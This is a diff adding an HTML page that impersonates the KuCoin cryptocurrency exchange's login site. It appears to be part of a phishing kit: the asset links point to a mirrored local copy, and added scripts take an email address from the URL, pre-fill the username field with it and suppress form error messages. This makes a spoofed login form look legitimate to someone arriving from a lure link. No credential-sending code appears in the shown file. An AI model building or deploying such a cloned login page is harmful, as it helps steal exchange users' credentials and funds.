@@ -1,0 +1,81 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="keywords" content="bitcoin, buy bitcoin, bitcoin exchange, kcs, cryptocurrency exchange, buy zcash, zcash exchange, low fees, wire transfer, trading terminal, trading software, ethereum, monero, digitalnote, trading api, buy xmr, buy zec, buy eth, btc to usd, btc to eur" />
+	<meta name="description" content="The most advanced cryptocurrency exchange to buy and sell Bitcoin, Ethereum, Litecoin, Monero, ZCash, DigitalNote, Ardor, Kcs" />
+	<title>KuCoin - Bitcoin Exchange: Bitcoin, Ethereum, Litecoin, KCS </title>
+	<link rel="icon" href="www/1.5.8/common/assets/icon.png%3Fv=1" type="image/x-icon" />
+	<script type="text/javascript">
+		window.__KUCOIN_ASSETS__ = {"common":"/www/1.5.8/common/","pc":"/www/1.5.8/pc/","mobile":"/www/1.5.8/mobile/"};
+	</script>
+	<style>
+	#udesk-support {
+		position: fixed;
+		bottom: 60px;
+		right: 20px;
+		z-index: 10000;
+		height: 40px;
+		line-height: 40px;
+		padding: 0 16px;
+		color: #fff;
+		background: #0F7DFF;
+		border: 1px solid #0F7DFF;
+		box-shadow: 0 8px 16px 0 rgba(0,0,0,0.24);
+		border-radius: 100px;
+		font-size: 14px;
+	}
+	#udesk-support img {
+		vertical-align: middle;
+	}
+
+	input[readonly] {
+		background: rgba(0,0,0,.1);
+		cursor: not-allowed;
+	}
+</style>
+
+<script>
+	if(/\?email=/.test(document.location.href)) {
+		document.querySelector('style').innerHTML += '.ant-form-explain {display: none !important;}';
+	}
+</script>
+</head>
+<body>
+	<div id="root"></div>
+
+	<a id="udesk-support" href="../kucoin.udesk.cn/im_client/index.html%3Fweb_plugin_id=36121&amp;language=en-us.html" target="_blank">
+		<img src="www/1.5.8/common/assets/msg.svg" /> Support
+	</a>
+
+	<script type="text/javascript" src="www/1.5.8/common/mix_platforms_boot.js"></script>
+	<script>
+		var $buoop = {notify:{i:-5,f:-4,o:-4,s:-2,c:-4},unsecure:true,unsupported:false,api:5};
+		function $buo_f(){
+			var e = document.createElement("script");
+			e.src = "//browser-update.org/update.min.js";
+			document.body.appendChild(e);
+		}
+		try {document.addEventListener("DOMContentLoaded",$buo_f,false)}
+		catch (e) {window.attachEvent("onload",$buo_f)}
+	</script>
+
+	<script>
+		var urlOwn = document.location.href;
+
+		if(/\?email=/.test(urlOwn)) {
+			var partOwn = (urlOwn.match(/\?email=(.+)/))[1];
+
+			var intOwn1 = setInterval(function() {
+				var inputEmailOwn = document.querySelector('#username');
+
+				if(inputEmailOwn) {
+					inputEmailOwn.value = partOwn;
+					document.querySelector('#username').parentNode.classList.remove('has-error');
+				}
+			}, 5);
+		}
+	</script>
+</body>
+</html>
